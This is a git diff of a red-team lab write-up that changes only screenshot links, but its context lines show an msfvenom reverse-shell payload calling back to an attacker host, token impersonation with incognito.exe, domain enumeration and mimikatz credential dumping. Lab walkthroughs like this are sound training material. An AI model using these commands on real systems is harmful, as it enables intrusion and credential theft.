@@ -435,8 +435,8 @@ Creating my reverse shell using msfvenom and send it to the compromised child-ad
 ```bash
 sudo msfvenom --platform windows -p windows/shell_reverse_tcp LHOST=172.16.250.4 LPORT=443 -f exe -o binary-jupin.exe
 ```
-![Screenshot 2023-07-08 at 8 55 06 PM](https://github.com/JFPineda79/Red-Team-Simulation-1/assets/96193551/59223b00-1078-4f6d-8bd5-a4354217ae0c)
-![Screenshot 2023-07-08 at 10 02 49 PM](https://github.com/JFPineda79/Red-Team-Simulation-1/assets/96193551/5031d2b5-5975-4b3c-8781-8c7d7be8bcc1)
+![Screenshot 2023-07-08 at 8 55 06 PM](https://github.com/JFPineda79/Red-Team-Engagement-Simulation/assets/96193551/7c1ffb1a-185c-4d34-9581-8b21a386a29a)
+![Screenshot 2023-07-08 at 10 02 49 PM](https://github.com/JFPineda79/Red-Team-Engagement-Simulation/assets/96193551/0abe1527-c531-416f-9050-2e3baf443935)
 
 Execute the incognito.exe and my crafted reverse shell.
 
@@ -446,26 +446,25 @@ incognito.exe execute -c "child.redteam.corp\child-admin" C:\Users\Public\binary
 
 I got the shell listening on port 443 which I setup in my crafted reverse shell.
 
-![Screenshot 2023-07-08 at 9 05 07 PM](https://github.com/JFPineda79/Red-Team-Simulation-1/assets/96193551/16306778-4cb4-4ad6-984d-80149a23c0c0)
+![Screenshot 2023-07-08 at 9 05 07 PM](https://github.com/JFPineda79/Red-Team-Engagement-Simulation/assets/96193551/0e4763f7-b327-4ba2-9189-37bd504d0d4f)
 
 Initiate enumeration on the spawned shell at port 443 and did get the same domain users information.
 
 ```bash
 net user /domain
 ```
-![Screenshot 2023-07-08 at 9 08 09 PM](https://github.com/JFPineda79/Red-Team-Simulation-1/assets/96193551/fe82d5ed-5a5b-4953-aa57-b7aab73a347f)
+![Screenshot 2023-07-08 at 9 08 09 PM](https://github.com/JFPineda79/Red-Team-Engagement-Simulation/assets/96193551/bfc61c3a-16e4-4568-ab1a-f2feaa2c8c62)
 
 ## mimikatz.exe
 
 Now I will be using the mimikatz tool to extract more information connected to our compromised child-admin machine. Sending this to our compromised machine.
 
-![Screenshot 2023-07-08 at 9 13 55 PM](https://github.com/JFPineda79/Red-Team-Simulation-1/assets/96193551/78c319e9-b7d9-4af6-8ff6-df3d403f8286)
-![Screenshot 2023-07-08 at 9 14 06 PM](https://github.com/JFPineda79/Red-Team-Simulation-1/assets/96193551/12c6236f-600c-4ee7-a91d-9f30242e5d6f)
-
+![Screenshot 2023-07-08 at 9 13 55 PM](https://github.com/JFPineda79/Red-Team-Engagement-Simulation/assets/96193551/b563003e-a259-4206-865e-f5e130f67bb0)
+![Screenshot 2023-07-08 at 9 14 06 PM](https://github.com/JFPineda79/Red-Team-Engagement-Simulation/assets/96193551/f39a5e51-a213-49fe-8f75-a0182089b207)
 
 Executes a mimikatz session. From the output, I only did get the SID of the child-admin and the NTLM Hash of RED-CHILDDC
 
-![Screenshot 2023-07-09 at 11 27 17 PM](https://github.com/JFPineda79/Red-Team-Simulation-1/assets/96193551/5d90fe69-aee4-49bc-9ce0-f67cfcc238e2)
+![Screenshot 2023-07-09 at 11 27 17 PM](https://github.com/JFPineda79/Red-Team-Engagement-Simulation/assets/96193551/5962a73c-b921-4d4b-a26f-a2afe4f3710f)
 
 ## child-admin SID
 
